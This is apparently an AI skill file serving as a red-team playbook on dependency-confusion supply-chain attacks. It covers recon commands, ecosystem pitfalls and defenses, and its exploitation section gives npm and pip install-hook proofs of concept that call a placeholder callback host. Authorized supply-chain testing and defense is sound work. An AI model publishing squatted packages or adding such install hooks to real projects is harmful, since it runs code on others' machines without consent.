---
name: dependency-confusion
description: >-
  Supply-chain testing via package-manager dependency confusion: when internal package names resolve to attacker-controlled public registries, leading to malicious install and script execution. Use for npm/pip/gem/Maven/Composer/Docker manifest review and authorized red-team supply-chain exercises.
---

# SKILL: Dependency Confusion — Supply Chain Attack Playbook

> **AI LOAD INSTRUCTION**: Expert dependency-confusion methodology. Covers how private package names leak, how public registries can win version resolution, ecosystem-specific pitfalls (npm scopes, pip extra indexes, Maven repo order), recon commands, non-destructive PoC patterns (callbacks, not data exfil), and defensive controls. Pair with supply-chain recon workflows when manifests or CI caches are in scope. **Only use on systems and programs you are authorized to test.**

## 0. QUICK START

**What to look for first**

- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.
- Evidence the **same name** might exist—or be **squattable**—on a **public** registry with a **higher semver** than the private feed publishes.
- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.

**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the “newest” matching version may be the attacker’s.*

Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions.

---

## 1. CORE CONCEPT

1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply “ours”), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.
2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).
3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.
4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) → **attacker code runs** on developer laptops, CI, or production image builds.

This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire.

---

## 2. AFFECTED ECOSYSTEMS

| Ecosystem | Typical manifest | Confusion angle |
|-----------|------------------|-----------------|
| **npm** | `package.json` | **Scoped** packages (`@scope/pkg`) are **safer** when the scope is **owned** on the registry; **unscoped** private-style names are **high risk**. Multiple registries / `.npmrc` `registry` vs per-scope `@scope:registry=` misconfiguration increases risk. |
| **pip** | `requirements.txt`, `pyproject.toml`, `setup.py` | `pip install -i` / **`--extra-index-url`** merges indexes; a public index can serve a **higher version** for the same distribution name. |
| **RubyGems** | `Gemfile` | **`source`** order and additional sources; ambiguous gem names reachable from rubygems.org. |
| **Maven** | `pom.xml` | **Repository** declaration **order** and **mirror** settings; a public repo publishing the same `groupId:artifactId` under a higher version can win if policy allows. |
| **Composer** | `composer.json` | **Packagist** is default; private packages without **`repositories`**/`canonical` discipline may collide with public names. |
| **Docker** | `FROM`, image tags | **Typosquatting** on container registries (e.g. public hub) for images with names similar to internal base images. |

---

## 3. RECONNAISSANCE

**Where internal names leak**

- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.
- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.
- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.
- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.

**Check public squatting / claimability (read-only)**

```bash
# npm — metadata for a name (unscoped)
npm view some-internal-package-name version

# npm — scoped (requires scope to exist / be readable)
npm view @some-scope/internal-lib versions --json

# PyPI — dry-run style version probe (adjust name; fails if not found)
python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'

# RubyGems — query remote
gem search '^some-internal-package-name$' --remote

# Maven Central — search coordinates (example pattern)
# curl "https://search.maven.org/solrsearch/select?q=g:com.example+AND+a:internal-lib&rows=1&wt=json"
```

Routing note: after package-name enumeration, consider PoC only in authorized environments; public registry lookups themselves are usually passive recon.

---

## 4. EXPLOITATION

**Authorized testing pattern**

1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.
2. Publish a **higher semver** than the legitimate internal line **within the victim’s declared range** (e.g. `^1.0.0` → publish `9.9.9`).
3. Add **lifecycle hooks** that prove execution without harming hosts—prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.

**npm `package.json` — minimal callback-style PoC (illustrative)**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "authorized dependency-confusion PoC only",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — shell + curl fallback (illustrative)**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — setup hook pattern (illustrative; use only in authorized lab packages)**

```python
# setup.py (excerpt)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) — automate version bump, publish, and callback confirmation **only where you have written permission**.

---

## 5. TOOLS

| Tool | Role |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | Scans manifest files for dependency names that may be **claimable** on public registries (multi-ecosystem). |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | Automated **dependency confusion** testing workflows (use strictly in-scope). |

Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties.

---

## 6. DEFENSE

- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.
- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.
- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.
- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.
- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.
- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.
- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages.

---

## 7. DECISION TREE

```text
Do manifests reference package names that could be non-unique globally?
├─ NO → Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.
└─ YES
    ├─ Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?
    │   ├─ YES → Lower risk; still verify CI and developer machines do not override config.
    │   └─ NO → HIGH RISK
    │         ├─ Can a public registry publish a HIGHER version inside declared ranges?
    │         │   ├─ YES → Treat as exploitable in authorized tests; prove with callback PoC.
    │         │   └─ NO → Check pre-release tags, local `file:` deps, and stale lockfiles.
    │         └─ Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)
```

---

## Related routing

- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps.
